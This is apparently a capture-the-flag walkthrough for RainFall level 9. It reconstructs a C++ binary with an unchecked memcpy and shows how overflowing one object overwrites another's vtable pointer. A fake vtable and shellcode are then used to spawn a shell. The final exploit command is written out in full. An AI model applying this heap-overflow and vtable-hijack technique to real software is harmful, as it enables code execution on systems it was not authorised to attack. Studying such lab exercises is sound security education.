# RainFall Walkthrough — Level 9 → Level 10

## Step 1 — Program Structure

The binary is a **C++ program** using classes and vtables. Let’s reconstruct the logic of `main`:

```cpp
int main(int argc, char **argv) {
    if (argc < 2)
        _exit(1);

    N *a = new N(5);
    N *b = new N(6);

    a->setAnnotation(argv[1]);
    (b->vtable->operator_plus)(b, a);
}
```

Key points:

* `N` has a **vtable pointer** at offset `0x0`.
* `setAnnotation(argv[1])` copies input into an internal buffer with **no bounds check**.
* At the end, `b->operator+(a)` is called **via the vtable**.

👉 If we overwrite `b`’s vtable pointer, we control the function call.

---

## Step 2 — Vulnerable Function

```cpp
void N::setAnnotation(char *str) {
    size_t len = strlen(str);
    memcpy(this + 4, str, len);
}
```

* Writes user input into the buffer at offset `+4`.
* **No length check** → overflow into adjacent memory.
* Eventually, we can overwrite the **vtable pointer at offset 0x0**.

That’s the vulnerability.

---

## Step 3 — Virtual Call Mechanics

At the end of `main`, the code does:

```asm
mov eax, [esp+0x10]   ; eax = b
mov eax, [eax]        ; eax = b->vtable
mov edx, [eax]        ; edx = b->vtable[0]
call edx              ; calls operator+
```

Normally → calls `N::operator+`.
If we corrupt `b->vtable`, it will call **any address we control**.

---

## Step 4 — Exploit Strategy

1. Create object `a` and `b`.
2. Use `a->setAnnotation(argv[1])` to overflow into `b`.
3. Overwrite `b->vtable` with a pointer inside our buffer.
4. Place a fake vtable and shellcode there.
5. When `b->operator+(a)` is called → it jumps to our shellcode.

---

## Step 5 — Finding the Offset

Using a cyclic pattern, crash analysis showed:

```
eax = 0x41366441
```

This corresponds to **offset 108**.

So: after 108 bytes, we reach and overwrite the vtable pointer.

---

## Step 6 — Crafting the Payload

Memory layout we want:

```
[ fake vtable entry ] → shellcode address
[ shellcode ]         → execve("/bin/sh")
[ padding ]
[ overwrite vtable ]  → pointer to fake vtable
```

Example payload:

```python
python -c 'print "\x10\xa0\x04\x08" + SHELLCODE + "A"*76 + "\x0c\xa0\x04\x08"'
```

At runtime:

* `b->vtable = 0x804a00c` (points into our buffer).
* `b->vtable[0] = 0x804a010` (points at our shellcode).
* Program executes `call edx` → jumps into shellcode. ✅

---

## Step 7 — Why Use Shellcode

* Earlier levels relied on GOT overwrites.
* Here, vtable corruption is simpler.
* **NX is disabled**, so injected shellcode runs.
* `system()` isn’t directly available → shellcode is the clean solution.

---

## Step 8 — Memory Visualization

### Before Overflow

```
b->vtable → [0x08048848] → legit N::operator+()
```

### After Overflow

```
b->vtable → [0x0804a00c] → [0x0804a010] → SHELLCODE!
```

So the virtual function call ends up running our shellcode.

---

## Final Step — Success

Exploit command:

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + SHELLCODE + "A"*76 + "\x0c\xa0\x04\x08"')
```

This spawns a shell as **level10**.
